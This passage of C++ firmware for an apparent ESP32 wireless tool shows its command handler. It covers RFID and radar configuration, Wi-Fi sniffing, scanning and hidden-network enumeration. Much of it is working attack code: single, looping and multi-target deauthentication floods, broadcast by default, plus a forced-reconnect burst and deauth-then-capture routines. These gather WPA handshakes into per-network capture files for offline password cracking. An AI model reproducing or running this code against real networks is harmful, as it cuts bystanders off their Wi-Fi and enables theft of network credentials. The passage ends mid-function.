            sclGpio,
            error
        );
        JsonDocument resp;
        resp["ok"] = configSaved;
        resp["config_saved"] = configSaved;
        resp["detection_ok"] = pn532Nfc.connected();
        if (!configSaved) {
            resp["msg"] = error;
        } else if (!pn532Nfc.connected() && !error.isEmpty()) {
            resp["msg"] = String("Configuration saved, but ") + error;
        } else {
            resp["msg"] = "rfid config saved";
        }
        pn532Nfc.appendStatus(resp);
        String json;
        serializeJson(resp, json);
        proto.sendRaw(TYPE_RESP, id, (const uint8_t*)json.c_str(), json.length());
    }

    else if (strcmp(cmd, "RFID_SCAN_START") == 0) {
        String error;
        const bool ok = pn532Nfc.startScan(error);
        sendRfidStatusResp(id, ok, ok ? "rfid scanning started" : error.c_str());
    }

    else if (strcmp(cmd, "RFID_SCAN_STOP") == 0) {
        pn532Nfc.stopScan();
        sendRfidStatusResp(id, true, "rfid scanning stopped");
    }

    // ── LD2450 MM-WAVE RADAR ──────────────────────────────────────────────
    else if (strcmp(cmd, "LD2450_SET_CONFIG") == 0) {
        const int rxPin = doc["args"]["rx_gpio"] | -1;
        const int txPin = doc["args"]["tx_gpio"] | -1;
        String error;
        const bool ok = validateLd2450Pins(rxPin, txPin, error);
        if (ok) {
            ld2450.stop();
            ld2450RxGpio = rxPin;
            ld2450TxGpio = txPin;
            saveLd2450Config();
            resetLd2450EventTracking();
        }
        sendLd2450StatusResp(id, ok, ok ? "ld2450 config saved" : error.c_str());
    }

    else if (strcmp(cmd, "LD2450_START") == 0) {
        String error;
        if (!validateLd2450Pins(ld2450RxGpio, ld2450TxGpio, error)) {
            sendLd2450StatusResp(id, false, error.c_str());
            return;
        }
        const bool debug = doc["args"]["debug"] | false;
        ld2450.stop();
        bool ok = ld2450.begin(
            Serial1,
            LD2450_BAUD,
            ld2450RxGpio,
            ld2450TxGpio,
            debug
        );
        resetLd2450EventTracking();
        sendLd2450StatusResp(id, ok, ok ? "ld2450 started" : "ld2450 start failed");
    }

    else if (strcmp(cmd, "LD2450_STOP") == 0) {
        ld2450.stop();
        resetLd2450EventTracking();
        sendLd2450StatusResp(id, true, "ld2450 stopped");
    }

    else if (strcmp(cmd, "LD2450_STATUS") == 0) {
        sendLd2450StatusResp(id, true, nullptr);
    }

    // ── START_SNIFF ──────────────────────────────────────────────────────
    else if (strcmp(cmd, "START_SNIFF") == 0) {
        radioIdle();  // stop beacon / portal / prior sniff before starting

        const char* band = doc["args"]["band"] | "auto";
        WifiBandMode bandMode = WifiBandMode::BAND_2G;
        String bandError;
        if (!configureWifiBand(band, bandMode, bandError)) {
            proto.sendResp(id, false, bandError.c_str());
            return;
        }

        const char* mode      = doc["args"]["mode"] | "fixed";
        bool        eapolOnly = doc["args"]["eapol_only"] | false;
        bool        allBeacons = doc["args"]["all_beacons"] | false;
        const char* bssidStr  = doc["args"]["bssid"] | "";
        const bool allow5ghz = bandMode != WifiBandMode::BAND_2G;

        uint8_t bssid[6];
        bool hasBssid = parseMac(bssidStr, bssid);
        sniffer.setEapolFilter(eapolOnly, hasBssid ? bssid : nullptr, allBeacons);

        bool ok;
        if (strcmp(mode, "hop") == 0) {
            uint16_t interval = doc["args"]["interval_ms"] | 300;
            ok = sniffer.startHop(interval, allow5ghz);
        } else {
            uint8_t channel = doc["args"]["channel"] | 1;
            if (!isValidWifiChannel(channel)) {
                proto.sendResp(id, false, "invalid channel");
                return;
            }
            String regulatoryError;
            if (!validateRegulatoryChannel(channel, regulatoryError)) {
                proto.sendResp(id, false, regulatoryError.c_str());
                return;
            }
            ok = sniffer.startFixed(channel, allow5ghz);
        }

        proto.sendResp(id, ok, ok ? "sniffing started" : "invalid channel");
    }

    // ── STOP_SNIFF ────────────────────────────────────────────────────────
    else if (strcmp(cmd, "STOP_SNIFF") == 0) {
        SniffStats s = sniffer.stats();
        if (sniffer.active()) {
            sniffer.stop();
        } else {
            esp_wifi_set_promiscuous(false);
        }
        JsonDocument resp;
        resp["ok"]       = true;
        resp["captured"] = s.captured;
        resp["sent"]     = s.sent;
        resp["dropped"]  = s.dropped;
        String json; serializeJson(resp, json);
        proto.sendRaw(TYPE_RESP, id, (const uint8_t*)json.c_str(), json.length());
    }

    // ── CLIENT / PRESENCE DETECTOR ───────────────────────────────────────
    else if (strcmp(cmd, "START_CLIENT_DETECT") == 0) {
        radioIdle();

        const char* band = doc["args"]["band"] | "auto";
        WifiBandMode bandMode = WifiBandMode::BAND_2G;
        String bandError;
        if (!configureWifiBand(band, bandMode, bandError)) {
            proto.sendResp(id, false, bandError.c_str());
            return;
        }
        const bool allow5ghz = bandMode != WifiBandMode::BAND_2G;

        const char* mode = doc["args"]["mode"] | "fixed";
        bool ok;
        if (strcmp(mode, "hop") == 0) {
            uint16_t interval = doc["args"]["interval_ms"] | 300;
            ok = sniffer.startClientHop(interval, allow5ghz);
        } else {
            uint8_t channel = doc["args"]["channel"] | 1;
            if (!isValidWifiChannel(channel)) {
                proto.sendResp(id, false, "invalid channel");
                return;
            }
            String regulatoryError;
            if (!validateRegulatoryChannel(channel, regulatoryError)) {
                proto.sendResp(id, false, regulatoryError.c_str());
                return;
            }
            ok = sniffer.startClientFixed(channel, allow5ghz);
        }

        proto.sendResp(id, ok, ok ? "client detection started" : "invalid channel");
    }

    else if (strcmp(cmd, "STOP_CLIENT_DETECT") == 0) {
        if (sniffer.active()) {
            sniffer.stop();
        } else {
            esp_wifi_set_promiscuous(false);
        }
        SniffStats s = sniffer.stats();
        JsonDocument resp;
        resp["ok"]       = true;
        resp["captured"] = s.captured;
        resp["sent"]     = s.sent;
        resp["dropped"]  = s.dropped;
        String json; serializeJson(resp, json);
        proto.sendRaw(TYPE_RESP, id, (const uint8_t*)json.c_str(), json.length());
    }

    // ── HIDDEN AP ENUMERATOR ─────────────────────────────────────────────
    else if (strcmp(cmd, "START_HIDDEN_AP") == 0) {
        radioIdle();

        const char* band = doc["args"]["band"] | "auto";
        WifiBandMode bandMode = WifiBandMode::BAND_2G;
        String bandError;
        if (!configureWifiBand(band, bandMode, bandError)) {
            proto.sendResp(id, false, bandError.c_str());
            return;
        }

        HiddenApConfig config;
        const char* mode = doc["args"]["mode"] | "fixed";
        config.hop = strcmp(mode, "hop") == 0;
        config.include5ghz = bandMode != WifiBandMode::BAND_2G;
        config.channel = doc["args"]["channel"] | 1;
        config.intervalMs = doc["args"]["interval_ms"] | 300;
        if (!config.hop) {
            String regulatoryError;
            if (!validateRegulatoryChannel(config.channel, regulatoryError)) {
                proto.sendResp(id, false, regulatoryError.c_str());
                return;
            }
        }

        bool ok = hiddenApDetector.start(config);
        proto.sendResp(id, ok, ok ? "hidden AP detection started" : "invalid channel");
    }

    else if (strcmp(cmd, "STOP_HIDDEN_AP") == 0) {
        HiddenApStats hs = hiddenApDetector.stats();
        hiddenApDetector.stop();
        JsonDocument resp;
        resp["ok"]        = true;
        resp["hidden"]    = hs.hiddenSeen;
        resp["candidates"]= hs.candidates;
        resp["resolved"]  = hs.resolved;
        resp["sent"]      = hs.sent;
        resp["dropped"]   = hs.dropped;
        String json; serializeJson(resp, json);
        proto.sendRaw(TYPE_RESP, id, (const uint8_t*)json.c_str(), json.length());
    }

    else if (strcmp(cmd, "HIDDEN_AP_FORCE_RECONNECT") == 0) {
        const char* bssidStr  = doc["args"]["bssid"]  | "";
        const char* clientStr = doc["args"]["client"] | "FF:FF:FF:FF:FF:FF";
        uint8_t bssid[6] = {0};
        uint8_t client[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};

        if (!parseMac(bssidStr, bssid)) {
            proto.sendResp(id, false, "invalid bssid");
            return;
        }
        parseMac(clientStr, client);

        uint8_t  channel   = doc["args"]["channel"] | 1;
        uint16_t count     = doc["args"]["count"] | 5;
        uint16_t interval  = doc["args"]["interval_ms"] | 60;
        uint8_t  reason    = doc["args"]["reason"] | 7;

        bool ok = hiddenApDetector.forceReconnect(
            bssid, client, channel, count, interval, reason
        );
        proto.sendResp(id, ok, ok ? "reconnect burst sent" : "hidden AP detector not active or TX failed");
    }

    // ── SET_CHANNEL ──────────────────────────────────────────────────────
    else if (strcmp(cmd, "SET_CHANNEL") == 0) {
        uint8_t channel = doc["args"]["channel"] | 1;
        if (!isValidWifiChannel(channel)) {
            proto.sendResp(id, false, "invalid channel");
            return;
        }
        String regulatoryError;
        if (!validateRegulatoryChannel(channel, regulatoryError)) {
            proto.sendResp(id, false, regulatoryError.c_str());
            return;
        }
        bool ok = sniffer.setChannel(channel);
        proto.sendResp(id, ok, ok ? "channel set" : "channel change failed");
    }

    // ── SCAN_WIFI ─────────────────────────────────────────────────────────
    else if (strcmp(cmd, "SCAN_WIFI") == 0) {
        bool wasSniffing = sniffer.active();
        uint8_t prevChannel = sniffer.channel();
        bool wasHopping = sniffer.hopping();

        radioIdle();

        const char* band = doc["args"]["band"] | "auto";
        WifiBandMode bandMode = WifiBandMode::BAND_2G;
        String bandError;
        if (!configureWifiBand(band, bandMode, bandError, false)) {
            proto.sendResp(id, false, bandError.c_str());
            return;
        }

        uint32_t settleMs = doc["args"]["settle_ms"] | WIFI_SCAN_DEFAULT_SETTLE_MS;
        settleMs = constrain(settleMs, WIFI_SCAN_MIN_SETTLE_MS, WIFI_SCAN_MAX_SETTLE_MS);
        uint16_t dwellMs = doc["args"]["dwell_ms"] | WIFI_SCAN_DEFAULT_DWELL_MS;
        dwellMs = constrain(dwellMs, WIFI_SCAN_MIN_DWELL_MS, WIFI_SCAN_MAX_DWELL_MS);
        int n = idf_scan_networks(proto, bandMode, settleMs, dwellMs);
        if (n == -2) {
            proto.sendResp(id, false, "scan already in progress");
            return;
        }
        if (n < 0) {
            proto.sendResp(id, false, "scan failed");
            return;
        }

        const bool pullResults = doc["args"]["pull_results"] | false;
        uint32_t scanId = 0;
        if (pullResults) {
            scanId = g_nextScanId++;
            scanResults.begin(ScanResultStore::Kind::Wifi, scanId);
        }

        int emittedCount = 0;
        int storedCount = 0;
        if (n > 0) {
            uint16_t count = (uint16_t)n;
            wifi_ap_record_t* records = (wifi_ap_record_t*)malloc(
                count * sizeof(wifi_ap_record_t));

            esp_err_t recordsErr = records
                ? esp_wifi_scan_get_ap_records(&count, records)
                : ESP_ERR_NO_MEM;
            if (recordsErr == ESP_OK) {
                for (int i = 0; i < count; i++) {
                    // The C5 scan bitmap can still return both bands in some
                    // IDF/board states. Enforce the requested band here so the
                    // app never receives cross-band results for an explicit
                    // 2.4/5 GHz scan.
                    if (bandMode == WifiBandMode::BAND_2G && records[i].primary >= 36) {
                        continue;
                    }
                    if (bandMode == WifiBandMode::BAND_5G && records[i].primary < 36) {
                        continue;
                    }

                    char bssid_str[18];
                    snprintf(bssid_str, sizeof(bssid_str),
                             "%02X:%02X:%02X:%02X:%02X:%02X",
                             records[i].bssid[0], records[i].bssid[1],
                             records[i].bssid[2], records[i].bssid[3],
                             records[i].bssid[4], records[i].bssid[5]);

                    if (pullResults) {
                        ScanResultStore::Record result;
                        memcpy(result.ssid, records[i].ssid, sizeof(result.ssid));
                        result.ssid[sizeof(result.ssid) - 1] = '\0';
                        memcpy(result.bssid, records[i].bssid, sizeof(result.bssid));
                        result.channel = records[i].primary;
                        result.rssi = records[i].rssi;
                        strncpy(
                            result.security,
                            authModeStr(records[i].authmode),
                            sizeof(result.security) - 1
                        );
                        result.security[sizeof(result.security) - 1] = '\0';
                        result.wps = (bool)records[i].wps;
                        result.band = records[i].primary >= 36 ? 1 : 0;
                        if (scanResults.add(result)) storedCount++;
                    } else {
                        JsonDocument ev;
                        ev["ssid"]     = (char*)records[i].ssid;
                        ev["bssid"]    = bssid_str;
                        ev["channel"]  = records[i].primary;
                        ev["rssi"]     = records[i].rssi;
                        ev["security"] = authModeStr(records[i].authmode);
                        ev["wps"]      = (bool)records[i].wps;
                        ev["band"]     = wifiBandForChannel(records[i].primary);
                        proto.sendEvent("scan_ap", ev);
                        // Scan bursts can contain many AP frames back-to-back. On
                        // UART bridges a full TX queue was observed to corrupt or
                        // drop event frames, so drain each frame before queueing
                        // the next one.
                        proto.flushActive();
                        delay(2);
                        emittedCount++;
                    }
                }
            } else {
                NRSUITE_DEBUG_PRINTF(
                    "SCAN_WIFI: esp_wifi_scan_get_ap_records failed: %s (%d), records=%s\n",
                    esp_err_to_name(recordsErr),
                    (int)recordsErr,
                    records ? "allocated" : "malloc-failed"
                );
            }
            free(records);
        }

        finishWifiScan(true);
        const int reportedCount = pullResults ? storedCount : emittedCount;
        NRSUITE_DEBUG_PRINTF(
            "SCAN_WIFI: response raw_count=%d reported_count=%d pull=%s band=%s\n",
            n,
            reportedCount,
            pullResults ? "yes" : "no",
            wifiBandModeName(bandMode)
        );

        JsonDocument resp;
        resp["ok"] = true;
        resp["count"] = reportedCount;
        resp["scanned"] = n;
        resp["band"] = wifiBandModeName(bandMode);
        resp["dwell_ms"] = dwellMs;
        if (pullResults) {
            resp["scan_id"] = scanId;
            resp["kind"] = "wifi";
            resp["truncated"] = n > reportedCount;
        }
        String json; serializeJson(resp, json);
        proto.sendRaw(TYPE_RESP, id, (const uint8_t*)json.c_str(), json.length());


        if (wasSniffing) {
            if (wasHopping) sniffer.startHop(300);
            else sniffer.startFixed(prevChannel, isWifi5GhzEnabled());
        }
    }

    // ── SCAN_RESULTS ──────────────────────────────────────────────────────
    // Pull-based retrieval for SCAN_WIFI/WPS_LOCK_SCAN snapshots. Each chunk
    // is small, offset-addressed, and carries a CRC over the deterministic
    // canonical result fields so the app can retry corrupt/missing chunks.
    else if (strcmp(cmd, "SCAN_RESULTS") == 0) {
        const uint32_t scanId = doc["args"]["scan_id"] | 0;
        const size_t offset = doc["args"]["offset"] | 0;
        uint16_t limit = doc["args"]["limit"] | ScanResultStore::kDefaultChunkLimit;
        if (limit == 0) limit = ScanResultStore::kDefaultChunkLimit;
        if (limit > ScanResultStore::kMaxChunkLimit) {
            limit = ScanResultStore::kMaxChunkLimit;
        }

        if (scanId == 0 || !scanResults.matches(scanId)) {
            proto.sendResp(id, false, "scan result snapshot not found");
            return;
        }
        if (offset > scanResults.count()) {
            proto.sendResp(id, false, "scan result offset out of range");
            return;
        }

        JsonDocument resp;
        resp["ok"] = true;
        resp["scan_id"] = scanId;
        resp["kind"] = scanResults.kindName();
        resp["offset"] = (uint32_t)offset;
        resp["limit"] = limit;
        resp["total"] = (uint32_t)scanResults.count();
        resp["crc32"] = scanResults.crc32ForRange(offset, limit);
        JsonArray results = resp["results"].to<JsonArray>();
        size_t nextOffset = offset;
        const size_t chunkCount = scanResults.appendResults(
            results,
            offset,
            limit,
            nextOffset
        );
        resp["count"] = (uint32_t)chunkCount;
        resp["next_offset"] = (uint32_t)nextOffset;
        String json;
        serializeJson(resp, json);
        proto.sendRaw(TYPE_RESP, id, (const uint8_t*)json.c_str(), json.length());
    }

    // ── DEAUTH_MULTI ─────────────────────────────────────────────────────
    // Firmware-native multi-target deauth with per-target channel scheduling.
    else if (strcmp(cmd, "DEAUTH_MULTI") == 0) {
        JsonVariant args = doc["args"];
        JsonArray targets = args["targets"].as<JsonArray>();
        if (targets.isNull() || targets.size() == 0) {
            proto.sendResp(id, false, "targets required");
            return;
        }
        if (targets.size() > deauth_multi::kMaxTargets) {
            proto.sendResp(id, false, "too many targets");
            return;
        }

        const char* clientStr = args["client"] | "FF:FF:FF:FF:FF:FF";
        uint8_t client[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
        if (!parseMac(clientStr, client)) {
            proto.sendResp(id, false, "invalid client");
            return;
        }

        gDeauthMultiTargetCount = 0;
        for (JsonVariant targetVar : targets) {
            const char* bssidStr = targetVar["bssid"] | "";
            uint8_t channel = targetVar["channel"].as<uint8_t>();
            uint8_t bssid[6] = {0};
            if (!parseMac(bssidStr, bssid)) {
                proto.sendResp(id, false, "invalid target bssid");
                return;
            }
            if (!isValidWifiChannel(channel)) {
                proto.sendResp(id, false, "invalid target channel");
                return;
            }
            String regulatoryError;
            if (!validateRegulatoryChannel(channel, regulatoryError)) {
                proto.sendResp(id, false, regulatoryError.c_str());
                return;
            }
            bool duplicate = false;
            for (size_t existing = 0; existing < gDeauthMultiTargetCount; ++existing) {
                if (memcmp(gDeauthMultiTargets[existing].bssid, bssid, 6) == 0) {
                    duplicate = true;
                    break;
                }
            }
            if (duplicate) {
                proto.sendResp(id, false, "duplicate target bssid");
                return;
            }
            DeauthMultiTarget& target = gDeauthMultiTargets[gDeauthMultiTargetCount++];
            target = DeauthMultiTarget{};
            memcpy(target.bssid, bssid, 6);
            target.channel = channel;
        }

        const char* modeStr = args["mode"] | "burst";
        const bool loopMode = strcmp(modeStr, "loop") == 0;
        if (!loopMode && strcmp(modeStr, "burst") != 0) {
            proto.sendResp(id, false, "invalid mode");
            return;
        }

        uint32_t count = args["count"].as<uint32_t>();
        if (count == 0) count = 20;
        count = deauth_multi::clampFrameCount(count);
        uint32_t durationSec = args["duration"].as<uint32_t>();
        durationSec = deauth_multi::clampDurationSec(durationSec);
        uint16_t intervalMs = deauth_multi::kDefaultIntervalMs;
        if (args["interval_ms"].is<uint16_t>()) {
            intervalMs = args["interval_ms"].as<uint16_t>();
        } else if (args["deauth_interval_ms"].is<uint16_t>()) {
            intervalMs = args["deauth_interval_ms"].as<uint16_t>();
        }
        intervalMs = deauth_multi::clampIntervalMs(intervalMs);
        uint8_t reason = args["reason"].is<uint8_t>() ? args["reason"].as<uint8_t>() : 7;

        radioIdle();

        memcpy(gDeauthMultiClient, client, 6);
        gDeauthMultiCountPerTarget = count;
        gDeauthMultiDurationSec = durationSec;
        gDeauthMultiIntervalMs = intervalMs;
        gDeauthMultiReason = reason;

        if (loopMode) {
            gDeauthMultiSent = 0;
            gDeauthMultiFailed = 0;
            gDeauthMultiStartedMs = millis();
            gDeauthMultiCurrentChannel = 0;
            gDeauthMultiCurrentBssid[0] = '\0';
            gDeauthMultiStopRequested = false;
            gDeauthMultiActive = true;
            for (size_t i = 0; i < gDeauthMultiTargetCount; ++i) {
                gDeauthMultiTargets[i].requested = 0;
                gDeauthMultiTargets[i].sent = 0;
                gDeauthMultiTargets[i].failed = 0;
            }

            BaseType_t created = xTaskCreate(
                deauthMultiTaskFn,
                "deauthMulti",
                4096,
                nullptr,
                1,
                &gDeauthMultiTaskHandle
            );
            if (created != pdPASS) {
                gDeauthMultiActive = false;
                gDeauthMultiTaskHandle = nullptr;
                proto.sendResp(id, false, "failed to start deauth multi task");
                return;
            }

            JsonDocument resp;
            resp["ok"] = true;
            resp["mode"] = "multi";
            resp["active"] = true;
            resp["target_count"] = gDeauthMultiTargetCount;
            resp["count"] = gDeauthMultiCountPerTarget;
            resp["duration"] = gDeauthMultiDurationSec;
            resp["interval_ms"] = gDeauthMultiIntervalMs;
            resp["requested_frames"] = 0;
            resp["sent_frames"] = 0;
            resp["failed_frames"] = 0;
            resp["elapsed_ms"] = 0;
            resp["pps"] = 0.0f;
            appendDeauthMultiTargets(resp);
            String json;
            serializeJson(resp, json);
            proto.sendRaw(TYPE_RESP, id, (const uint8_t*)json.c_str(), json.length());
            return;
        }

        runDeauthMultiBurst();
        const uint32_t elapsedMs = millis() - gDeauthMultiStartedMs;
        JsonDocument resp;
        resp["ok"] = true;
        resp["mode"] = "multi";
        resp["active"] = false;
        resp["target_count"] = gDeauthMultiTargetCount;
        resp["count"] = gDeauthMultiCountPerTarget;
        resp["duration"] = gDeauthMultiDurationSec;
        resp["interval_ms"] = gDeauthMultiIntervalMs;
        resp["requested_frames"] = deauthMultiRequestedTotal();
        resp["sent_frames"] = gDeauthMultiSent;
        resp["failed_frames"] = gDeauthMultiFailed;
        resp["elapsed_ms"] = elapsedMs;
        resp["pps"] = framesPerSecond(gDeauthMultiSent, elapsedMs);
        appendDeauthMultiTargets(resp);
        String json;
        serializeJson(resp, json);
        proto.sendRaw(TYPE_RESP, id, (const uint8_t*)json.c_str(), json.length());
    }

    // ── DEAUTH_BURST (capture-preserving) ────────────────────────────────
    // Sends a finite deauth burst without stopping an active sniffer. Android
    // uses this to retry deauth while waiting for a handshake capture.
    else if (strcmp(cmd, "DEAUTH_BURST") == 0) {
        JsonVariant args = doc["args"];
        const char* band = args["band"] | "auto";
        WifiBandMode bandMode = WifiBandMode::BAND_2G;
        String bandError;
        if (!configureWifiBand(band, bandMode, bandError)) {
            proto.sendResp(id, false, bandError.c_str());
            return;
        }

        uint8_t channel = args["channel"].as<uint8_t>() ? args["channel"].as<uint8_t>() : 1;
        if (!isValidWifiChannel(channel)) {
            proto.sendResp(id, false, "invalid channel");
            return;
        }
        String regulatoryError;
        if (!validateRegulatoryChannel(channel, regulatoryError)) {
            proto.sendResp(id, false, regulatoryError.c_str());
            return;
        }

        uint32_t count = args["count"].as<uint32_t>() ? args["count"].as<uint32_t>() : 1;
        count = constrain(count, 1U, 200U);
        uint16_t intervalMs = args["deauth_interval_ms"].as<uint16_t>() ?
            args["deauth_interval_ms"].as<uint16_t>() : 50;
        intervalMs = constrain(intervalMs, 10, 10000);
        uint8_t reason = args["reason"].as<uint8_t>() ? args["reason"].as<uint8_t>() : 7;

        const char* bssidStr = args["bssid"] | "";
        const char* clientStr = args["client"] | "FF:FF:FF:FF:FF:FF";
        uint8_t bssid[6] = {0};
        uint8_t client[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
        if (!parseMac(bssidStr, bssid)) {
            proto.sendResp(id, false, "invalid bssid");
            return;
        }
        if (!parseMac(clientStr, client)) {
            proto.sendResp(id, false, "invalid client");
            return;
        }

        esp_err_t setupErr = esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
        if (setupErr != ESP_OK) {
            String msg = "channel set failed: ";
            msg += esp_err_to_name(setupErr);
            proto.sendResp(id, false, msg.c_str());
            return;
        }
        wifi_config_t apCfg = {};
        setupErr = esp_wifi_get_config(WIFI_IF_AP, &apCfg);
        if (setupErr == ESP_OK) {
            apCfg.ap.channel = channel;
            setupErr = esp_wifi_set_config(WIFI_IF_AP, &apCfg);
        }
        if (setupErr == ESP_OK) {
            setupErr = esp_wifi_start();
        }
        if (setupErr != ESP_OK && setupErr != ESP_ERR_WIFI_STATE) {
            String msg = "WiFi setup failed: ";
            msg += esp_err_to_name(setupErr);
            proto.sendResp(id, false, msg.c_str());
            return;
        }
        delay(20);

        DeauthTxStats stats = transmitDeauthFrames(
            bssid, client, count, intervalMs, reason
        );

        JsonDocument resp;
        resp["ok"] = true;
        resp["mode"] = "burst";
        resp["channel"] = channel;
        resp["requested_frames"] = stats.requested;
        resp["sent_frames"] = stats.sent;
        resp["failed_frames"] = stats.failed;
        resp["interval_ms"] = intervalMs;
        resp["elapsed_ms"] = stats.elapsedMs;
        resp["pps"] = framesPerSecond(stats.sent, stats.elapsedMs);
        String json;
        serializeJson(resp, json);
        proto.sendRaw(TYPE_RESP, id, (const uint8_t*)json.c_str(), json.length());
    }

    // ── DEAUTH_STOP ──────────────────────────────────────────────────────
    else if (strcmp(cmd, "DEAUTH_STOP") == 0) {
        const bool multiWasActive =
            gDeauthMultiActive || gDeauthMultiTaskHandle != nullptr;
        const uint32_t sent = multiWasActive ? gDeauthMultiSent : gDeauthLoopSent;
        const uint32_t failed = multiWasActive ? gDeauthMultiFailed : gDeauthLoopFailed;
        const uint32_t startedMs = multiWasActive
            ? gDeauthMultiStartedMs
            : gDeauthLoopStartedMs;
        const uint32_t elapsedMs = startedMs == 0 ? 0 : (millis() - startedMs);
        stopDeauthLoopAndWait();
        stopDeauthMultiLoopAndWait();
        JsonDocument resp;
        resp["ok"] = true;
        resp["mode"] = multiWasActive ? "multi" : "loop";
        resp["sent_frames"] = sent;
        resp["failed_frames"] = failed;
        resp["elapsed_ms"] = elapsedMs;
        resp["pps"] = framesPerSecond(sent, elapsedMs);
        if (multiWasActive) {
            resp["target_count"] = gDeauthMultiTargetCount;
            appendDeauthMultiTargets(resp);
        }
        String json;
        serializeJson(resp, json);
        proto.sendRaw(TYPE_RESP, id, (const uint8_t*)json.c_str(), json.length());
    }

    // ── DEAUTH / DEAUTH_CAPTURE ──────────────────────────────────────────
    else if (strcmp(cmd, "DEAUTH") == 0 || strcmp(cmd, "DEAUTH_CAPTURE") == 0) {
        JsonVariant args = doc["args"];

        const char* band = args["band"] | "auto";
        WifiBandMode bandMode = WifiBandMode::BAND_2G;
        String bandError;
        if (!configureWifiBand(band, bandMode, bandError)) {
            proto.sendResp(id, false, bandError.c_str());
            return;
        }

        uint8_t channel = args["channel"].as<uint8_t>() ? args["channel"].as<uint8_t>() : 1;
        if (!isValidWifiChannel(channel)) {
            proto.sendResp(id, false, "invalid channel");
            return;
        }
        String regulatoryError;
        if (!validateRegulatoryChannel(channel, regulatoryError)) {
            proto.sendResp(id, false, regulatoryError.c_str());
            return;
        }

        const char* mode = args["mode"] | "burst";
        const bool loopMode = strcmp(mode, "loop") == 0 && strcmp(cmd, "DEAUTH") == 0;
        uint32_t count = args["count"].as<uint32_t>() ? args["count"].as<uint32_t>() : 150;
        count = constrain(count, 1U, 2000U);
        uint32_t durationSec = args["duration"].as<uint32_t>() ? args["duration"].as<uint32_t>() : 30;
        durationSec = constrain(durationSec, 0U, 3600U);
        uint8_t reason = args["reason"].as<uint8_t>() ? args["reason"].as<uint8_t>() : 7;
        uint16_t intervalMs = args["deauth_interval_ms"].as<uint16_t>() ?
            args["deauth_interval_ms"].as<uint16_t>() : 100;
        intervalMs = constrain(intervalMs, 10, 10000);

        const char* bssidStr = args["bssid"] | "";
        const char* clientStr = args["client"] | "FF:FF:FF:FF:FF:FF";
        uint8_t bssid[6] = {0};
        uint8_t client[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
        if (!parseMac(bssidStr, bssid)) {
            proto.sendResp(id, false, "invalid bssid");
            return;
        }
        if (!parseMac(clientStr, client)) {
            proto.sendResp(id, false, "invalid client");
            return;
        }

        radioIdle();
        esp_err_t setupErr = esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
        if (setupErr != ESP_OK) {
            String msg = "channel set failed: ";
            msg += esp_err_to_name(setupErr);
            proto.sendResp(id, false, msg.c_str());
            return;
        }

        wifi_config_t apCfg = {};
        setupErr = esp_wifi_get_config(WIFI_IF_AP, &apCfg);
        if (setupErr == ESP_OK) {
            apCfg.ap.channel = channel;
            setupErr = esp_wifi_set_config(WIFI_IF_AP, &apCfg);
        }
        if (setupErr == ESP_OK) {
            setupErr = esp_wifi_start();
        }
        if (setupErr != ESP_OK && setupErr != ESP_ERR_WIFI_STATE) {
            String msg = "WiFi setup failed: ";
            msg += esp_err_to_name(setupErr);
            proto.sendResp(id, false, msg.c_str());
            return;
        }
        delay(250);

        if (loopMode) {
            gDeauthLoopSent = 0;
            gDeauthLoopFailed = 0;
            gDeauthLoopDurationSec = durationSec;
            gDeauthLoopIntervalMs = intervalMs;
            gDeauthLoopReason = reason;
            memcpy(gDeauthLoopBssid, bssid, 6);
            memcpy(gDeauthLoopClient, client, 6);
            gDeauthLoopStartedMs = millis();
            gDeauthLoopStopRequested = false;
            gDeauthLoopActive = true;

            BaseType_t created = xTaskCreate(
                deauthLoopTaskFn,
                "deauthLoop",
                4096,
                nullptr,
                1,
                &gDeauthLoopTaskHandle
            );
            if (created != pdPASS) {
                gDeauthLoopActive = false;
                gDeauthLoopTaskHandle = nullptr;
                proto.sendResp(id, false, "failed to start deauth loop task");
                return;
            }

            JsonDocument resp;
            resp["ok"] = true;
            resp["mode"] = "loop";
            resp["active"] = true;
            resp["channel"] = channel;
            resp["duration"] = durationSec;
            resp["interval_ms"] = intervalMs;
            String json;
            serializeJson(resp, json);
            proto.sendRaw(TYPE_RESP, id, (const uint8_t*)json.c_str(), json.length());
            return;
        }

        DeauthTxStats stats = transmitDeauthFrames(
            bssid, client, count, intervalMs, reason
        );

        if (strcmp(cmd, "DEAUTH_CAPTURE") == 0) {
            sniffer.setEapolFilter(true, bssid);
            sniffer.startFixed(channel, bandMode != WifiBandMode::BAND_2G);
        }

        JsonDocument statsDoc;
        statsDoc["status"] = "finished";
        statsDoc["mode"] = "burst";
        statsDoc["bssid"] = bssidStr;
        statsDoc["client"] = clientStr;
        statsDoc["channel"] = (int)channel;
        statsDoc["count"] = count;
        statsDoc["requested_frames"] = stats.requested;
        statsDoc["sent_frames"] = stats.sent;
        statsDoc["failed_frames"] = stats.failed;
        statsDoc["interval_ms"] = intervalMs;
        statsDoc["elapsed_ms"] = stats.elapsedMs;
        statsDoc["pps"] = framesPerSecond(stats.sent, stats.elapsedMs);
        statsDoc["reason"] = reason;
        proto.sendEvent("deauth_stats", statsDoc);

        JsonDocument resp;
        resp["ok"] = true;
        resp["mode"] = "burst";
        resp["channel"] = channel;
        resp["requested_frames"] = stats.requested;
        resp["sent_frames"] = stats.sent;
        resp["failed_frames"] = stats.failed;
        resp["interval_ms"] = intervalMs;
        resp["elapsed_ms"] = stats.elapsedMs;
        resp["pps"] = framesPerSecond(stats.sent, stats.elapsedMs);
        String json;
        serializeJson(resp, json);
        proto.sendRaw(TYPE_RESP, id, (const uint8_t*)json.c_str(), json.length());
    }

    // ── DEAUTH_CHANNEL_CAPTURE ───────────────────────────────────────────
    // Pwnagotchi/Nrugochi-style multi-AP deauth on one channel followed by
    // all-EAPOL + all-beacon capture. This keeps the Android PCAP collector
    // open and lets Android split frames into per-BSSID HS_<BSSID>.pcap files.
    else if (strcmp(cmd, "DEAUTH_CHANNEL_CAPTURE") == 0) {
        JsonVariant args = doc["args"];
        const char* band = args["band"] | "auto";
        WifiBandMode bandMode = WifiBandMode::BAND_2G;
        String bandError;
        if (!configureWifiBand(band, bandMode, bandError)) {
            proto.sendResp(id, false, bandError.c_str());
            return;
        }
        const bool allow5ghz = bandMode != WifiBandMode::BAND_2G;
